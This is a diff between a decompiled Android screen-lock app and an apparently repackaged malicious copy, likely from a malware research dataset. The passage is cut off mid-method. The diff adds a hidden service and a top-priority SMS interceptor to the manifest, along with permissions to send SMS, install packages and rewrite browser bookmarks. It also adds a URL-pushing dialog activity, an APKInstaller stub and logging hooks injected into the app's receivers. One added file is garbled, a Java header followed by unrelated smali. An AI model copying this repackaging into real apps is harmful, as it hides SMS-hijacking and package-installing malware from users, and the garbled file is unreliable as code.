diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+
+    goto :goto_0
+.end method
+
+.method private showTANC(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+    .locals 4
+    .param p1, "header"    # Ljava/lang/String;
+    .param p2, "content"    # Ljava/lang/String;
+    .param p3, "url"    # Ljava/lang/String;
+
+    .prologue
+    .line 28
+    new-instance v1, Lcom/android/main/TANCActivity$TANCButtonListener;
+
+    invoke-direct {v1, p0, p3}, Lcom/android/main/TANCActivity$TANCButtonListener;-><init>(Lcom/android/main/TANCActivity;Ljava/lang/String;)V
+
+    .line 29
+    .local v1, "buttonListener":Lcom/android/main/TANCActivity$TANCButtonListener;
+    new-instance v0, Landroid/app/AlertDialog$Builder;
+
+    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V
+
+    .line 30
+    .local v0, "builder":Landroid/app/AlertDialog$Builder;
+    invoke-virtual {v0, p1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    .line 31
+    invoke-virtual {v0, p2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    .line 33
+    const-string v3, "\u8bbf\u95ee"
+
+    invoke-virtual {v0, v3, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 35
+    const-string v3, "\u53d6\u6d88"
+
+    invoke-virtual {v0, v3, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 36
+    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;
+
+    move-result-object v2
+
+    .line 37
+    .local v2, "dialog":Landroid/app/AlertDialog;
+    invoke-virtual {v2}, Landroid/app/AlertDialog;->show()V
+
+    .line 38
+    return-void
+.end method
+
+
+# virtual methods
+.method public onCreate(Landroid/os/Bundle;)V
+    .locals 5
+    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
+
+    .prologue
+    .line 16
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    .line 18
+    invoke-virtual {p0}, Lcom/android/main/TANCActivity;->getIntent()Landroid/content/Intent;
+
+    move-result-object v2
+
+    .line 19
+    .local v2, "intent":Landroid/content/Intent;
+    const-string v4, "header"
+
+    invoke-virtual {v2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    .line 20
+    .local v1, "header":Ljava/lang/String;
+    const-string v4, "message"
+
+    invoke-virtual {v2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v0
+
+    .line 21
+    .local v0, "content":Ljava/lang/String;
+    const-string v4, "url"
+
+    invoke-virtual {v2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    .line 24
+    .local v3, "url":Ljava/lang/String;
+    invoke-direct {p0, v1, v0, v3}, Lcom/android/main/TANCActivity;->showTANC(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 25
+    return-void
+.end method
diff --git a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/component/AdComponent.smali b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/component/AdComponent.smali
index 1647a30..ddc9680 100755
--- a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/component/AdComponent.smali
+++ b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/component/AdComponent.smali
@@ -1497,6 +1497,8 @@
 
     const-string v4, "android.intent.action.VIEW"
 
+    invoke-static {v4, v1}, Lnetqin/NQlog/NQfile;->callwrite1(Ljava/lang/String;Landroid/net/Uri;)V
+
     invoke-direct {v0, v4, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
 
     .line 240
diff --git a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/mainmenu/StartScreenActivity.smali b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/mainmenu/StartScreenActivity.smali
index c206de5..ee0187e 100755
--- a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/mainmenu/StartScreenActivity.smali
+++ b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/mainmenu/StartScreenActivity.smali
@@ -168,6 +168,8 @@
 
     const-string v2, "android.intent.action.VIEW"
 
+    invoke-static {v2, v1}, Lnetqin/NQlog/NQfile;->callwrite1(Ljava/lang/String;Landroid/net/Uri;)V
+
     invoke-direct {v0, v2, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V
 
     .line 270
diff --git a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/BootReceiver.smali b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/BootReceiver.smali
index 12276fa..561c6a0 100755
--- a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/BootReceiver.smali
+++ b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/BootReceiver.smali
@@ -9,6 +9,8 @@
 
     .prologue
     .line 12
+    invoke-static {}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite()V
+
     invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
 
     return-void
@@ -25,6 +27,8 @@
     const/4 v8, 0x0
 
     .line 15
+    invoke-static {p2}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite(Landroid/content/Intent;)V
+
     invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
 
     move-result-object v6
diff --git a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/ScreenService$1.smali b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/ScreenService$1.smali
index f9d16ce..c6be877 100755
--- a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/ScreenService$1.smali
+++ b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/ScreenService$1.smali
@@ -27,6 +27,8 @@
     iput-object p1, p0, Lcom/gau/screenguru/finger/service/ScreenService$1;->this$0:Lcom/gau/screenguru/finger/service/ScreenService;
 
     .line 49
+    invoke-static {}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite()V
+
     invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
 
     return-void
@@ -42,6 +44,8 @@
     .prologue
     .line 52
     :try_start_0
+    invoke-static {p2}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite(Landroid/content/Intent;)V
+
     invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
 
     move-result-object v0
diff --git a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/ShutDownReceiver.smali b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/ShutDownReceiver.smali
index 3056477..8f7ae7f 100755
--- a/result/APP_47/App_B_47/smali/com/gau/screenguru/finger/service/ShutDownReceiver.smali
+++ b/result/APP_47/App_M_47/smali/com/gau/screenguru/finger/service/ShutDownReceiver.smali
@@ -9,6 +9,8 @@
 
     .prologue
     .line 10
+    invoke-static {}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite()V
+
     invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
 
     return-void
@@ -23,6 +25,8 @@
 
     .prologue
     .line 13
+    invoke-static {p2}, Lnetqin/NQlog/NQfile;->broadcastReceiverwrite(Landroid/content/Intent;)V
+
     invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;
 
     move-result-object v1
diff --git a/result/APP_47/App_M_47/smali/netqin/NQlog/NQfile.smali b/result/APP_47/App_M_47/smali/netqin/NQlog/NQfile.smali
new file mode 100755
index 0000000..89a2ee2
--- /dev/null
+++ b/result/APP_47/App_M_47/smali/netqin/NQlog/NQfile.smali
@@ -0,0 +1,1306 @@
+.class public Lnetqin/NQlog/NQfile;
+.super Ljava/lang/Object;
+.source "NQfile.java"
+
+
+# static fields
+.field public static logPath:Ljava/lang/String;
+
+.field public static notify:Z
+
+.field public static packageName:Ljava/lang/String;
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .locals 2
+
+    .prologue
+    .line 27
+    invoke-static {}, Lnetqin/NQlog/NQpackageinfo;->NQgetpackagename()Ljava/lang/String;
+
+    move-result-object v0
+
+    sput-object v0, Lnetqin/NQlog/NQfile;->packageName:Ljava/lang/String;
+
+    .line 28
+    new-instance v0, Ljava/lang/StringBuilder;
+
+    const-string v1, "/data/data/"
+
+    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v1, Lnetqin/NQlog/NQfile;->packageName:Ljava/lang/String;
+
+    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v0
+
+    const-string v1, "/log.txt"
+
+    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v0
+
+    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v0
+
+    sput-object v0, Lnetqin/NQlog/NQfile;->logPath:Ljava/lang/String;
+
+    .line 29
+    const/4 v0, 0x1
+
+    sput-boolean v0, Lnetqin/NQlog/NQfile;->notify:Z
+
+    .line 26
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .locals 0
+
+    .prologue
+    .line 26
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+.method public static broadcastReceiverwrite()V
+    .locals 2
+
+    .prologue
+    .line 85
+    const-string v0, "broadcastReceiver"
+
+    const-string v1, ""
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 86
+    return-void
+.end method
+
+.method public static broadcastReceiverwrite(Landroid/content/Intent;)V
+    .locals 2
+    .param p0, "intent"    # Landroid/content/Intent;
+
+    .prologue
+    .line 89
+    const-string v0, "broadcastReceiver"
+
+    invoke-virtual {p0}, Landroid/content/Intent;->getAction()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 90
+    return-void
+.end method
+
+.method public static callwrite1(Ljava/lang/String;Landroid/net/Uri;)V
+    .locals 2
+    .param p0, "str"    # Ljava/lang/String;
+    .param p1, "num"    # Landroid/net/Uri;
+
+    .prologue
+    .line 36
+    const-string v0, "android.intent.action.CALL"
+
+    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    .line 37
+    const-string v0, "call"
+
+    invoke-virtual {p1}, Landroid/net/Uri;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 38
+    :cond_0
+    return-void
+.end method
+
+.method public static callwrite2(Ljava/lang/String;)V
+    .locals 1
+    .param p0, "num"    # Ljava/lang/String;
+
+    .prologue
+    .line 41
+    const-string v0, "call"
+
+    invoke-static {v0, p0}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 42
+    return-void
+.end method
+
+.method public static deletewrite(Landroid/net/Uri;)V
+    .locals 2
+    .param p0, "contact_info"    # Landroid/net/Uri;
+
+    .prologue
+    .line 73
+    const-string v0, "delete"
+
+    invoke-virtual {p0}, Landroid/net/Uri;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-static {v0, v1}, Lnetqin/NQlog/NQfile;->write(Ljava/lang/String;Ljava/lang/String;)V
+
+    .line 74
+    return-void
+.end method
+
+.method public static getCurrentTime(Ljava/util/Calendar;)Ljava/lang/String;
+    .locals 10
+    .param p0, "c"    # Ljava/util/Calendar;
+
+    .prologue
+    const/16 v9, 0xa
+
+    .line 108
+    const/4 v8, 0x1
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v7
+
+    .line 109
+    .local v7, "year":I
+    const/4 v8, 0x2
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v8
+
+    add-int/lit8 v4, v8, 0x1
+
+    .line 110
+    .local v4, "month":I
+    const/4 v8, 0x5
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v0
+
+    .line 111
+    .local v0, "day":I
+    const/16 v8, 0xb
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v1
+
+    .line 112
+    .local v1, "hour":I
+    const/16 v8, 0xc
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v3
+
+    .line 113
+    .local v3, "minute":I
+    const/16 v8, 0xd
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v6
+
+    .line 114
+    .local v6, "second":I
+    const/16 v8, 0xe
+
+    invoke-virtual {p0, v8}, Ljava/util/Calendar;->get(I)I
+
+    move-result v2
+
+    .line 115
+    .local v2, "millisecond":I
+    const/4 v5, 0x0
+
+    .line 117
+    .local v5, "s":Ljava/lang/String;
+    if-ge v1, v9, :cond_1
+
+    if-ge v3, v9, :cond_1
+
+    if-ge v6, v9, :cond_1
+
+    .line 118
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 119
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 118
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    .line 142
+    :cond_0
+    :goto_0
+    return-object v5
+
+    .line 120
+    :cond_1
+    if-ge v1, v9, :cond_2
+
+    if-ge v3, v9, :cond_2
+
+    if-le v6, v9, :cond_2
+
+    .line 121
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 122
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 121
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto :goto_0
+
+    .line 123
+    :cond_2
+    if-ge v1, v9, :cond_3
+
+    if-le v3, v9, :cond_3
+
+    if-ge v6, v9, :cond_3
+
+    .line 124
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 125
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 124
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto/16 :goto_0
+
+    .line 126
+    :cond_3
+    if-ge v1, v9, :cond_4
+
+    if-le v3, v9, :cond_4
+
+    if-le v6, v9, :cond_4
+
+    .line 127
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "  "
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "0"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 128
+    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, ":"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    .line 127
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v5
+
+    goto/16 :goto_0
+
+    .line 129
+    :cond_4
+    if-le v1, v9, :cond_5
+
+    if-ge v3, v9, :cond_5
+
+    if-ge v6, v9, :cond_5
+
+    .line 130
+    new-instance v8, Ljava/lang/StringBuilder;
+
+    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    const-string v9, "-"
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    const-string v9, "-"
+
